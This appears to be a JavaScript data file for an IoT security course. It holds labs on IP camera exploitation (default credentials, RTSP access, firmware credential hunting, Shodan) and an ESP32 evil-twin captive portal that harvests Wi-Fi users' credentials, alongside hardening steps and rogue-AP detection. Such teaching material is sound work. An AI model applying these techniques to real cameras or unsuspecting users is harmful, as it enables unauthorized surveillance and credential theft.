                correct: 'The trust center link key ("ZigBeeAlliance09") decrypts only the key transport frame. The network key (unique per network) is what decrypts actual data traffic. You need to capture the join process to extract the network key.',
                incorrect: 'Entering the default trust center link key in Wireshark and expecting all Zigbee traffic to become readable.',
                consequence: 'Only the key exchange frames decrypt. All regular data frames remain encrypted because they use the network-specific key, not the trust center key.'
            }
        ] },

    'sg-67': {
        // Wokwi wave 4: NO SIM — real IP camera target.
        simulator: { available: false, note: 'This lab probes a real <strong>IP camera&#39;s</strong> firmware and network services &mdash; you need an actual camera (or a known-vulnerable device) as the target. The methodology (recon, RTSP/HTTP probing, credential and firmware analysis) is the transferable part here.' }, intro: '<p>Cheap IP cameras ($15&ndash;30) are notoriously insecure. Default credentials, unencrypted RTSP streams, exposed web interfaces, and firmware with hardcoded backdoors. In this project you will discover cameras on your network, access their streams, analyze their firmware, and properly secure them.</p>', wiring: '    Cheap IP camera + isolated network + Raspberry Pi', wiringNotes: '<p><strong>Isolation:</strong> Put the camera on an isolated VLAN or network segment. Many cheap cameras phone home to servers in China, stream to cloud services you did not consent to, and have UPnP enabled by default (exposing themselves to the internet).</p>', wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 400" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="sg67-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '<style>' +
            '@keyframes sg67-stream{0%{stroke-dashoffset:16}100%{stroke-dashoffset:0}}' +
            '@keyframes sg67-alert{0%,70%{opacity:0.2}80%{opacity:1}100%{opacity:0.2}}' +
            '</style>' +
            '</defs>' +
            '<rect width="720" height="400" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="380" fill="url(#sg67-grid)" rx="4"/>' +
            '<text x="360" y="30" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-67 IP CAMERA EXPLOITATION</text>' +

            '<!-- IP Camera -->' +
            '<rect x="40" y="80" width="170" height="160" rx="8" fill="#1e2736" stroke="#ef4444" stroke-width="1.5"/>' +
            '<rect x="40" y="80" width="170" height="24" rx="8" fill="rgba(239,68,68,0.12)"/>' +
            '<rect x="40" y="96" width="170" height="8" fill="rgba(239,68,68,0.12)"/>' +
            '<text x="125" y="96" text-anchor="middle" fill="#f87171" font-size="9" font-weight="600">CHEAP IP CAMERA</text>' +
            '<text x="125" y="120" text-anchor="middle" fill="#8b949e" font-size="7">Port 80: Web UI</text>' +
            '<text x="125" y="136" text-anchor="middle" fill="#8b949e" font-size="7">Port 554: RTSP stream</text>' +
            '<text x="125" y="152" text-anchor="middle" fill="#ef4444" font-size="7">admin/admin (default!)</text>' +
            '<text x="125" y="168" text-anchor="middle" fill="#ef4444" font-size="7">UPnP enabled</text>' +
            '<text x="125" y="184" text-anchor="middle" fill="#ef4444" font-size="7">Cloud P2P active</text>' +
            '<!-- Camera lens icon -->' +
            '<circle cx="125" cy="210" r="12" fill="#1a1f2b" stroke="#ef4444" stroke-width="1"/>' +
            '<circle cx="125" cy="210" r="5" fill="rgba(239,68,68,0.3)" stroke="#ef4444" stroke-width="0.5" style="animation:sg67-alert 2s ease-in-out infinite"/>' +

            '<!-- Raspberry Pi (Attacker/Auditor) -->' +
            '<rect x="290" y="80" width="160" height="120" rx="8" fill="#1e2736" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<rect x="290" y="80" width="160" height="24" rx="8" fill="rgba(59,130,246,0.12)"/>' +
            '<rect x="290" y="96" width="160" height="8" fill="rgba(59,130,246,0.12)"/>' +
            '<text x="370" y="96" text-anchor="middle" fill="#60a5fa" font-size="9" font-weight="600">RASPBERRY PI</text>' +
            '<text x="370" y="120" text-anchor="middle" fill="#8b949e" font-size="7">nmap -sV (discovery)</text>' +
            '<text x="370" y="136" text-anchor="middle" fill="#8b949e" font-size="7">ffplay (RTSP access)</text>' +
            '<text x="370" y="152" text-anchor="middle" fill="#8b949e" font-size="7">binwalk (FW analysis)</text>' +
            '<text x="370" y="168" text-anchor="middle" fill="#8b949e" font-size="7">tcpdump (traffic monitor)</text>' +
            '<text x="370" y="184" text-anchor="middle" fill="#a855f7" font-size="7">Isolated VLAN</text>' +

            '<!-- Cloud Server (China) -->' +
            '<rect x="540" y="80" width="140" height="90" rx="8" fill="#1e2736" stroke="#ef4444" stroke-width="1.5"/>' +
            '<rect x="540" y="80" width="140" height="24" rx="8" fill="rgba(239,68,68,0.12)"/>' +
            '<rect x="540" y="96" width="140" height="8" fill="rgba(239,68,68,0.12)"/>' +
            '<text x="610" y="96" text-anchor="middle" fill="#f87171" font-size="9" font-weight="600">CLOUD SERVER</text>' +
            '<text x="610" y="120" text-anchor="middle" fill="#8b949e" font-size="7">Alibaba Cloud</text>' +
            '<text x="610" y="136" text-anchor="middle" fill="#ef4444" font-size="7">Phones home on boot</text>' +
            '<text x="610" y="152" text-anchor="middle" fill="#ef4444" font-size="7">Streams without consent</text>' +

            '<!-- Router -->' +
            '<rect x="290" y="240" width="160" height="50" rx="6" fill="rgba(249,115,22,0.08)" stroke="rgba(249,115,22,0.3)" stroke-width="1"/>' +
            '<text x="370" y="262" text-anchor="middle" fill="#f97316" font-size="9" font-weight="600">NETWORK ROUTER</text>' +
            '<text x="370" y="278" text-anchor="middle" fill="#8b949e" font-size="7">IoT VLAN isolation</text>' +

            '<!-- RTSP stream wire -->' +
            '<line x1="210" y1="130" x2="290" y2="130" stroke="#ef4444" stroke-width="1.5" stroke-dasharray="6,3" style="animation:sg67-stream 1.2s linear infinite"/>' +
            '<text x="250" y="122" text-anchor="middle" fill="#ef4444" font-size="6">RTSP</text>' +

            '<!-- Camera to cloud -->' +
            '<line x1="210" y1="140" x2="540" y2="120" stroke="#ef4444" stroke-width="1" stroke-dasharray="4,3" style="animation:sg67-stream 2s linear infinite"/>' +
            '<text x="400" y="112" text-anchor="middle" fill="#ef4444" font-size="6">Phone Home</text>' +

            '<!-- Camera to router -->' +
            '<line x1="125" y1="240" x2="290" y2="260" stroke="#f97316" stroke-width="1" stroke-dasharray="3,2"/>' +
            '<!-- Pi to router -->' +
            '<line x1="370" y1="200" x2="370" y2="240" stroke="#3b82f6" stroke-width="1" stroke-dasharray="3,2"/>' +

            '<!-- Vulnerability callout -->' +
            '<rect x="40" y="310" width="300" height="60" rx="6" fill="rgba(239,68,68,0.06)" stroke="rgba(239,68,68,0.2)" stroke-width="0.5"/>' +
            '<text x="50" y="328" fill="#ef4444" font-size="8" font-weight="600">ATTACK SURFACE</text>' +
            '<text x="50" y="344" fill="#8b949e" font-size="7">Default creds + unencrypted RTSP + UPnP + cloud P2P</text>' +
            '<text x="50" y="358" fill="#8b949e" font-size="7">Firmware: hardcoded backdoors, busybox, no updates</text>' +

            '<!-- Defense callout -->' +
            '<rect x="380" y="310" width="300" height="60" rx="6" fill="rgba(34,197,94,0.06)" stroke="rgba(34,197,94,0.2)" stroke-width="0.5"/>' +
            '<text x="390" y="328" fill="#22c55e" font-size="8" font-weight="600">HARDENING</text>' +
            '<text x="390" y="344" fill="#8b949e" font-size="7">Change creds + disable UPnP/cloud + VLAN isolate</text>' +
            '<text x="390" y="358" fill="#8b949e" font-size="7">Consider OpenIPC open-source firmware</text>' +

            '</svg>' +
            '</div>', steps: [ { title: 'Discover and Access', content: '<p>Find cameras on your network and access their streams.</p>', code: '# Scan for cameras\nsudo nmap -sV -p 80,443,554,8080,8554 192.168.1.0/24\n# Port 554 = RTSP (Real Time Streaming Protocol)\n# Port 80/8080 = Web interface\n\n# Try default credentials:\n# admin/admin, admin/password, admin/(blank), root/root\n# Check: https://www.ispyconnect.com/cameras for default creds by brand\n\n# Access RTSP stream:\n# ffplay rtsp://admin:admin@192.168.1.XXX:554/stream1\n# Or: vlc rtsp://admin:admin@192.168.1.XXX:554/stream1\n\n# Access web interface:\n# http://192.168.1.XXX (usually port 80 or 8080)', language: 'Bash', tip: '<strong>Shodan:</strong> Shodan.io indexes millions of exposed cameras worldwide. Search for "webcamxp" or "rtsp" to see the scale of the problem. Many are accessible with no credentials at all.' }, { title: 'Analyze Firmware', content: '<p>Download the camera firmware and extract it to look for hardcoded credentials, backdoors, and vulnerabilities.</p>', code: '# Download firmware from the manufacturer website\n# (or extract from the camera if it allows OTA check)\n\n# Install binwalk for firmware analysis\nsudo apt install binwalk -y\n\n# Extract the firmware\nbinwalk -e firmware.bin\ncd _firmware.bin.extracted/\n\n# Look for interesting files:\nfind . -name "*.conf" -o -name "passwd" -o -name "shadow" -o -name "*.key"\nfind . -name "*.sh" -exec grep -l "password\\|passwd\\|admin" {} \\;\n\n# Check for hardcoded credentials:\nstrings firmware.bin | grep -i "password\\|admin\\|root\\|secret"\n\n# Look for web server configs:\nfind . -name "lighttpd*" -o -name "httpd*" -o -name "nginx*"', language: 'Bash', tip: null }, { title: 'Secure the Camera', content: '<p>Apply security hardening to make the camera safe for use.</p>', code: '# 1. Change default credentials immediately\n#    Web interface > Settings > Account > Change password\n\n# 2. Disable UPnP (prevents auto-exposure to internet)\n#    Web interface > Network > UPnP > Disable\n\n# 3. Disable cloud/P2P services\n#    Web interface > Network > Cloud/P2P > Disable\n\n# 4. Put camera on isolated VLAN\n#    Router > VLAN settings > create IoT VLAN\n#    Block IoT VLAN from accessing main LAN\n#    Block IoT VLAN from accessing internet (if local-only)\n\n# 5. Monitor camera traffic\nsudo tcpdump -i eth0 host CAMERA_IP -n -c 100\n# Watch for unexpected outbound connections\n# Chinese cameras often connect to cloud servers even when disabled\n\n# 6. Consider open-source firmware:\n#    - OpenIPC (for HiSilicon/Ingenic cameras)\n#    - Removes all vendor backdoors and cloud dependencies', language: 'Bash', tip: '<strong>The real lesson:</strong> Most cheap IoT devices are designed for convenience, not security. The firmware is often a Linux distribution with default credentials, no encryption, and hardcoded backdoors for the manufacturer. The only way to fully trust a device is to replace its firmware with open source &mdash; or not connect it to your network at all.' } ], testing: '<p><strong>Verification checklist:</strong></p><ul><li>Camera discovered on network via nmap</li><li>RTSP stream accessed (with credentials)</li><li>Firmware extracted and analyzed with binwalk</li><li>Default credentials changed</li><li>UPnP and cloud services disabled</li><li>Camera isolated on separate VLAN or network</li></ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>nmap scan does not find the camera:</strong> Some cameras only respond on specific ports. Run a full port scan: <code>sudo nmap -sV -p- CAMERA_IP</code>. If the camera is not on your subnet, check your router DHCP lease list for its assigned IP. Some cameras default to a static IP like 192.168.1.10 that may conflict with your subnet.</li>' +
                         '<li><strong>RTSP stream shows "401 Unauthorized" even with correct credentials:</strong> Some cameras require the credentials in the URL path (<code>rtsp://user:pass@ip/stream</code>), others require RTSP DESCRIBE authentication. Try both <code>ffplay</code> and VLC &mdash; they handle RTSP authentication differently. Also try the alternate paths: <code>/stream1</code>, <code>/h264</code>, <code>/cam/realmonitor</code>, or <code>/live</code>.</li>' +
                         '<li><strong>binwalk extracts nothing from firmware:</strong> Some firmware images are encrypted or use non-standard formats. Try <code>binwalk -E firmware.bin</code> to check entropy. High entropy throughout (close to 1.0) suggests encryption or compression. Try <code>dd</code> to skip headers: <code>dd if=firmware.bin of=trimmed.bin bs=1 skip=64</code> and run binwalk on the trimmed file.</li>' +
                         '<li><strong>Camera keeps re-enabling cloud services after reboot:</strong> Some cameras reset configuration on reboot. You may need to modify the firmware or use firewall rules on your router to block the camera from reaching its cloud servers (block outbound connections from the camera IP to all destinations except your local network).</li>' +
                         '<li><strong>tcpdump shows camera contacting unknown IP addresses:</strong> This is expected for cheap cameras. Look up the IPs with <code>whois</code> or check them on Shodan. If they resolve to cloud services in China (Alibaba Cloud, Tencent Cloud), the camera is phoning home. Block these at the router level.</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: RTSP Brute Force Defense</strong> &mdash; Write a Python script that attempts to connect to the camera RTSP stream with a list of common default credentials. Time how long it takes to find valid credentials. Then configure the camera to use a strong password and verify the brute force fails. Calculate how long a full dictionary attack would take.</p>' +
                    '<p><strong>Challenge 2: Camera Traffic Analysis</strong> &mdash; Capture 24 hours of network traffic from the camera using tcpdump. Analyze where the camera connects, how often, and how much data it sends. Create a report showing: destination IPs, protocols used, data volume, and connection frequency. Identify any suspicious or unnecessary outbound traffic.</p>' +
                    '<p><strong>Challenge 3: Open-Source Firmware Comparison</strong> &mdash; If your camera uses a HiSilicon or Ingenic chip, download and install OpenIPC firmware. Compare the attack surface of the original firmware vs. OpenIPC: open ports, running services, outbound connections, and authentication requirements. Document the security improvements.</p>',

        commonMistakes: [
            {
                title: 'Connecting Camera to Main Network Before Assessment',
                correct: 'Connect the camera to an isolated VLAN or a dedicated test network before powering it on for the first time. Assess its behavior before granting it access to your main network.',
                incorrect: 'Plugging the camera directly into your main home or lab network and letting it connect to the internet immediately.',
                consequence: 'The camera phones home to cloud servers, potentially exposing your network information, registering with remote services, and opening UPnP ports on your router before you have a chance to disable these features.'
            },
            {
                title: 'Assuming Changed Web Password Secures RTSP',
                correct: 'Change credentials on both the web interface AND the RTSP stream independently. Test RTSP access separately after changing the web password.',
                incorrect: 'Changing the web admin password and assuming the RTSP stream password is also updated.',
                consequence: 'Many cheap cameras have separate credential stores for the web interface and RTSP. The RTSP stream remains accessible with default credentials even after the web password is changed.'
            },
            {
                title: 'Analyzing Firmware on the Same Network as the Camera',
                correct: 'Download firmware files to an isolated analysis workstation. Never execute extracted binaries from untrusted firmware on a machine connected to your production network.',
                incorrect: 'Running extracted firmware binaries or scripts on your main workstation to "see what they do."',
                consequence: 'Firmware from untrusted manufacturers may contain malware, backdoors, or scripts that scan and attack the local network. Running these on your main machine puts your entire network at risk.'
            }
        ] },

    'sg-68': {
        // Wokwi wave 4: NO SIM — real WiFi radio broadcasting to clients.
        simulator: { available: false, note: 'A <strong>rogue access point</strong> broadcasts real 802.11 beacons and captures real clients &mdash; Wokwi&#39;s high-level WiFi model can&#39;t transmit to actual devices. Study the AP/captive-portal code here; run it on a real ESP32.' }, intro: '<p>Build a rogue WiFi access point using an ESP32 that presents a captive portal to anyone who connects. When a victim joins the fake network, they see a login page that captures their credentials. This is an evil twin attack &mdash; one of the most common WiFi attacks in the real world.</p><p>This project teaches both offense (how the attack works) and defense (how to detect rogue APs). Only test on your own devices and networks.</p>', wiring: '    ESP32 DevKit -> creates a WiFi AP with captive portal', wiringNotes: '<p><strong>Authorization required.</strong> Only deploy on networks you own or have written permission to test. Deploying a rogue AP on a network without authorization is illegal.</p>', wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 400" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="sg68-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '<style>' +
            '@keyframes sg68-broadcast{0%{r:15;opacity:0.8}100%{r:80;opacity:0}}' +
            '@keyframes sg68-cred{0%{stroke-dashoffset:12}100%{stroke-dashoffset:0}}' +
            '</style>' +
            '</defs>' +
            '<rect width="720" height="400" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="380" fill="url(#sg68-grid)" rx="4"/>' +
            '<text x="360" y="30" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-68 EVIL TWIN / ROGUE ACCESS POINT</text>' +

            '<!-- ESP32 (Rogue AP) -->' +
            '<rect x="40" y="100" width="180" height="150" rx="8" fill="#1e2736" stroke="#ef4444" stroke-width="1.5"/>' +
            '<rect x="40" y="100" width="180" height="24" rx="8" fill="rgba(239,68,68,0.12)"/>' +
            '<rect x="40" y="116" width="180" height="8" fill="rgba(239,68,68,0.12)"/>' +
            '<text x="130" y="116" text-anchor="middle" fill="#f87171" font-size="9" font-weight="600">ESP32 ROGUE AP</text>' +
            '<text x="130" y="142" text-anchor="middle" fill="#ef4444" font-size="8">SSID: &quot;Free_WiFi&quot;</text>' +
            '<text x="130" y="160" text-anchor="middle" fill="#8b949e" font-size="7">Captive portal served</text>' +
            '<text x="130" y="176" text-anchor="middle" fill="#8b949e" font-size="7">DNS hijacking active</text>' +
            '<text x="130" y="192" text-anchor="middle" fill="#8b949e" font-size="7">HTTP 302 redirect</text>' +
            '<text x="130" y="210" text-anchor="middle" fill="#f97316" font-size="7">Serial: credential log</text>' +
            '<!-- Antenna icon -->' +
            '<line x1="130" y1="100" x2="130" y2="75" stroke="#ef4444" stroke-width="2"/>' +
            '<line x1="118" y1="82" x2="130" y2="75" stroke="#ef4444" stroke-width="1.5"/>' +
            '<line x1="142" y1="82" x2="130" y2="75" stroke="#ef4444" stroke-width="1.5"/>' +

            '<!-- WiFi broadcast waves -->' +
            '<circle cx="130" cy="75" r="15" fill="none" stroke="#ef4444" stroke-width="0.6" style="animation:sg68-broadcast 2.5s ease-out infinite"/>' +
            '<circle cx="130" cy="75" r="15" fill="none" stroke="#ef4444" stroke-width="0.6" style="animation:sg68-broadcast 2.5s ease-out infinite;animation-delay:0.8s"/>' +
            '<circle cx="130" cy="75" r="15" fill="none" stroke="#ef4444" stroke-width="0.6" style="animation:sg68-broadcast 2.5s ease-out infinite;animation-delay:1.6s"/>' +

            '<!-- Victim Phone -->' +
            '<rect x="310" y="70" width="130" height="80" rx="6" fill="#1e2736" stroke="#f97316" stroke-width="1.5"/>' +
            '<rect x="310" y="70" width="130" height="18" rx="6" fill="rgba(249,115,22,0.12)"/>' +
            '<rect x="310" y="82" width="130" height="6" fill="rgba(249,115,22,0.12)"/>' +
            '<text x="375" y="83" text-anchor="middle" fill="#fb923c" font-size="7" font-weight="600">VICTIM DEVICE</text>' +
            '<text x="375" y="102" text-anchor="middle" fill="#8b949e" font-size="6">Auto-connects to &quot;Free_WiFi&quot;</text>' +
            '<text x="375" y="116" text-anchor="middle" fill="#8b949e" font-size="6">Captive portal appears</text>' +
            '<text x="375" y="130" text-anchor="middle" fill="#ef4444" font-size="6">Enters credentials...</text>' +
            '<text x="375" y="142" text-anchor="middle" fill="#ef4444" font-size="6">user: victim@email.com</text>' +

            '<!-- Victim connects to rogue AP -->' +
            '<line x1="220" y1="140" x2="310" y2="110" stroke="#ef4444" stroke-width="1.5" stroke-dasharray="6,3" style="animation:sg68-cred 1.5s linear infinite"/>' +
            '<text x="265" y="112" text-anchor="middle" fill="#ef4444" font-size="6">WiFi</text>' +

            '<!-- Legitimate AP -->' +
            '<rect x="540" y="70" width="140" height="80" rx="8" fill="#1e2736" stroke="#22c55e" stroke-width="1.5"/>' +
            '<rect x="540" y="70" width="140" height="24" rx="8" fill="rgba(34,197,94,0.12)"/>' +
            '<rect x="540" y="86" width="140" height="8" fill="rgba(34,197,94,0.12)"/>' +
            '<text x="610" y="86" text-anchor="middle" fill="#4ade80" font-size="8" font-weight="600">LEGIT AP</text>' +
            '<text x="610" y="110" text-anchor="middle" fill="#22c55e" font-size="7">SSID: &quot;CorpWiFi&quot;</text>' +
            '<text x="610" y="126" text-anchor="middle" fill="#8b949e" font-size="7">BSSID: AA:BB:CC:DD:EE</text>' +
            '<text x="610" y="142" text-anchor="middle" fill="#22c55e" font-size="7">Authenticated</text>' +

            '<!-- Detection (Blue Team) -->' +
            '<rect x="310" y="200" width="180" height="100" rx="8" fill="#1e2736" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<rect x="310" y="200" width="180" height="24" rx="8" fill="rgba(59,130,246,0.12)"/>' +
            '<rect x="310" y="216" width="180" height="8" fill="rgba(59,130,246,0.12)"/>' +
            '<text x="400" y="216" text-anchor="middle" fill="#60a5fa" font-size="9" font-weight="600">ROGUE AP DETECTOR</text>' +
            '<text x="400" y="240" text-anchor="middle" fill="#8b949e" font-size="7">Scapy Dot11Beacon monitor</text>' +
            '<text x="400" y="256" text-anchor="middle" fill="#8b949e" font-size="7">Same SSID, different BSSID</text>' +
            '<text x="400" y="272" text-anchor="middle" fill="#22c55e" font-size="7">ALERT: Multiple APs detected!</text>' +
            '<text x="400" y="288" text-anchor="middle" fill="#f97316" font-size="7">WIPS (enterprise defense)</text>' +

            '<!-- Detector scanning both APs -->' +
            '<line x1="310" y1="240" x2="220" y2="200" stroke="#3b82f6" stroke-width="1" stroke-dasharray="4,3"/>' +
            '<line x1="490" y1="240" x2="540" y2="140" stroke="#3b82f6" stroke-width="1" stroke-dasharray="4,3"/>' +

            '<!-- Attack callout -->' +
            '<rect x="40" y="310" width="300" height="60" rx="6" fill="rgba(239,68,68,0.06)" stroke="rgba(239,68,68,0.2)" stroke-width="0.5"/>' +
            '<text x="50" y="328" fill="#ef4444" font-size="8" font-weight="600">EVIL TWIN ATTACK</text>' +
            '<text x="50" y="344" fill="#8b949e" font-size="7">Rogue AP + DNS hijack + captive portal</text>' +
            '<text x="50" y="358" fill="#8b949e" font-size="7">Captures credentials from unsuspecting users</text>' +

            '<!-- Defense callout -->' +
            '<rect x="380" y="310" width="300" height="60" rx="6" fill="rgba(34,197,94,0.06)" stroke="rgba(34,197,94,0.2)" stroke-width="0.5"/>' +
            '<text x="390" y="328" fill="#22c55e" font-size="8" font-weight="600">DEFENSE: 802.1X / WIPS</text>' +
            '<text x="390" y="344" fill="#8b949e" font-size="7">WPA-Enterprise (RADIUS) prevents evil twin</text>' +
            '<text x="390" y="358" fill="#8b949e" font-size="7">WIPS detects duplicate SSIDs with different BSSIDs</text>' +

            '</svg>' +
            '</div>', steps: [ { title: 'Flash Captive Portal Firmware', content: '<p>Flash the ESP32 with firmware that creates a WiFi access point and serves a captive portal page.</p>', code: '# Install PlatformIO CLI\npip3 install platformio\n\n# Clone a captive portal project\ngit clone https://github.com/CDFER/Captive-Portal-ESP32.git\ncd Captive-Portal-ESP32\n\n# Edit the SSID and portal page (src/main.cpp)\n# Set SSID to something like "Free_WiFi" or "Hotel_Guest"\n\n# Build and flash to ESP32\npio run -t upload\n\n# The ESP32 creates a WiFi network\n# When someone connects, their browser shows the captive portal\n# Any credentials entered are logged to Serial output', language: 'Bash', tip: null }, { title: 'Monitor Captured Data', content: '<p>Connect to the ESP32 serial output to see captured credentials.</p>', code: '# Open serial monitor\npio device monitor -b 115200\n\n# Connect to the fake WiFi from your test phone/laptop\n# The captive portal appears automatically\n# Enter test credentials\n# See them appear in the serial output\n\n# For a more advanced setup, log to an SD card\n# or send captured data to your C2 backend (SG-1)', language: 'Bash', tip: null }, { title: 'Build the Defense', content: '<p>Now switch to the blue team. Detect rogue access points on your network.</p>', code: '# Scan for all WiFi networks and look for duplicates\nsudo iwlist wlan0 scan | grep -E "ESSID|Address|Signal"\n\n# A rogue AP has:\n# - Same SSID as a legitimate network\n# - Different BSSID (MAC address)\n# - Often stronger signal (positioned closer to targets)\n\n# Automated detection with Python:\npip3 install scapy\npython3 << \'PYEOF\'\nfrom scapy.all import *\nfrom collections import defaultdict\n\nssids = defaultdict(set)\n\ndef handler(pkt):\n    if pkt.haslayer(Dot11Beacon):\n        ssid = pkt[Dot11Elt].info.decode(errors=\"ignore\")\n        bssid = pkt[Dot11].addr2\n        if ssid:\n            ssids[ssid].add(bssid)\n            if len(ssids[ssid]) > 1:\n                print(f"ALERT: Multiple APs for \\\"{ssid}\\\": {ssids[ssid]}")\n\nprint("Scanning for rogue access points (30s)...")\nsniff(iface="wlan0", prn=handler, timeout=30)\n\nfor ssid, bssids in ssids.items():\n    if len(bssids) > 1:\n        print(f"\\nSUSPICIOUS: \\\"{ssid}\\\" has {len(bssids)} BSSIDs: {bssids}")\nPYEOF', language: 'Bash', tip: '<strong>Enterprise defense:</strong> Organizations use Wireless Intrusion Prevention Systems (WIPS) that continuously scan for rogue APs and alert security teams. Products like Cisco Meraki, Aruba AirWave, and open-source tools like Kismet perform this function. The ESP32 rogue AP you built would be detected within seconds by a properly configured WIPS.' } ], testing: '<p><strong>Verification checklist:</strong></p><ul><li>ESP32 flashed and creating WiFi AP</li><li>Captive portal appears on connecting devices</li><li>Test credentials captured in serial output</li><li>Rogue AP detection script identifies multiple BSSIDs for same SSID</li><li>Can explain both the attack and the defense</li></ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>ESP32 creates AP but captive portal does not appear on phone:</strong> Modern phones detect captive portals by making HTTP requests to known URLs (e.g., Apple uses captive.apple.com, Android uses connectivitycheck.gstatic.com). The ESP32 must intercept ALL DNS requests and respond with its own IP address (DNS hijacking). Verify the firmware includes a DNS server that redirects everything to 192.168.4.1.</li>' +
                         '<li><strong>PlatformIO upload fails with "A fatal error occurred: Failed to connect":</strong> Hold the BOOT button on the ESP32 while initiating the upload. Some boards require manually entering bootloader mode. Release the button after you see "Connecting..." in the output.</li>' +
                         '<li><strong>Captive portal page looks broken or unstyled:</strong> The ESP32 has limited flash for serving web pages. Keep the HTML simple &mdash; inline CSS only, no external resources (fonts, images). The portal page must be entirely self-contained in a single HTML response.</li>' +
                         '<li><strong>Scapy rogue AP detection script shows "Permission denied":</strong> Scapy needs raw socket access. Run with <code>sudo</code>. Also ensure your WiFi adapter supports monitor mode. Not all USB WiFi adapters support this &mdash; check compatibility lists for Atheros or Ralink chipsets.</li>' +
                         '<li><strong>Phone connects to rogue AP but immediately disconnects:</strong> Modern phones check for internet connectivity after connecting. If the captive portal does not respond correctly to the connectivity check, the phone disconnects and reconnects to a known network. The firmware must respond with an HTTP 302 redirect to the portal page for connectivity check URLs.</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: Credential Harvesting Comparison</strong> &mdash; Create three different captive portal pages: a hotel WiFi login, a corporate SSO page, and a social media login. Test each on your own devices and document which design is most convincing. Then research how real phishing awareness training uses similar exercises to educate employees.</p>' +
                    '<p><strong>Challenge 2: Automated Rogue AP Detector</strong> &mdash; Extend the detection script to run as a service on your Pi. Have it continuously scan for rogue APs, compare against a whitelist of known BSSIDs, and send an alert (email, MQTT message, or webhook) when an unauthorized AP is detected matching a known SSID.</p>' +
                    '<p><strong>Challenge 3: 802.1X Enterprise WiFi Defense</strong> &mdash; Research how WPA-Enterprise (802.1X with RADIUS) defends against evil twin attacks compared to WPA-Personal (PSK). Set up a FreeRADIUS server on your Pi and configure a test SSID with EAP-TLS. Demonstrate that the evil twin cannot replicate the valid RADIUS certificate, causing clients to reject the connection.</p>',

        commonMistakes: [
            {
                title: 'Deploying Rogue AP on a Network Without Authorization',
                correct: 'Only deploy the rogue AP on your own isolated test network with your own test devices. Document your authorization and scope before testing.',
                incorrect: 'Deploying the rogue AP at a coffee shop, school, or workplace to "test" how many people connect.',
                consequence: 'Deploying a rogue access point on a network you do not own is illegal in most jurisdictions (Computer Fraud and Abuse Act in the US, Computer Misuse Act in the UK). You can face criminal charges, expulsion, or termination.'
            },
            {
                title: 'Using the Same SSID as a Neighbor Network',
                correct: 'Use a clearly fake SSID for testing (e.g., "HEXWORTH_TEST_AP") that does not match any nearby network.',
                incorrect: 'Setting the rogue AP SSID to match your neighbor\'s WiFi network name to see if their devices auto-connect.',
                consequence: 'Even in a lab environment, broadcasting an SSID that matches a real nearby network can cause their devices to connect to your AP. This is unauthorized interception of communications.'
            },
            {
                title: 'Forgetting to Power Off the Rogue AP After Testing',
                correct: 'Unplug or power off the ESP32 immediately after testing is complete. Never leave a rogue AP running unattended.',
                incorrect: 'Leaving the ESP32 powered on with the rogue AP broadcasting after the lab exercise is finished.',
                consequence: 'Unsuspecting visitors, neighbors, or family members may connect to the rogue AP and submit real credentials. You become an accidental attacker with real victim data on your device.'
            }
        ] },

    'sg-69': {
        // Wokwi wave 4: NO SIM — audits real smart-home devices.
        simulator: { available: false, note: 'A home-automation security audit inspects <strong>real smart-home devices</strong> and their traffic &mdash; the findings only exist against actual hardware. The audit checklist and tooling here apply to whatever devices you own.' }, intro: '<p>Audit the security of your own smart home by scanning every IoT device on your network. Check for default credentials, open ports, unencrypted communications, and cloud dependencies. Write a formal security audit report with findings and remediation recommendations.</p>', wiring: '    Raspberry Pi with scanning tools + your own smart home devices', wiringNotes: '<p><strong>Only audit devices you own.</strong> This is a security assessment of your personal network.</p>', wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 400" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="sg69-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '<style>' +
            '@keyframes sg69-scan{0%{stroke-dashoffset:16}100%{stroke-dashoffset:0}}' +
            '@keyframes sg69-pulse{0%,100%{opacity:0.3}50%{opacity:1}}' +
            '</style>' +
            '</defs>' +
            '<rect width="720" height="400" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="380" fill="url(#sg69-grid)" rx="4"/>' +
            '<text x="360" y="30" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-69 SMART HOME SECURITY AUDIT</text>' +

            '<!-- Raspberry Pi (Auditor) -->' +
            '<rect x="270" y="60" width="180" height="110" rx="8" fill="#1e2736" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<rect x="270" y="60" width="180" height="24" rx="8" fill="rgba(59,130,246,0.12)"/>' +
            '<rect x="270" y="76" width="180" height="8" fill="rgba(59,130,246,0.12)"/>' +
            '<text x="360" y="76" text-anchor="middle" fill="#60a5fa" font-size="9" font-weight="600">AUDIT STATION (Pi)</text>' +
            '<text x="360" y="100" text-anchor="middle" fill="#8b949e" font-size="7">nmap -sV -O (discovery)</text>' +
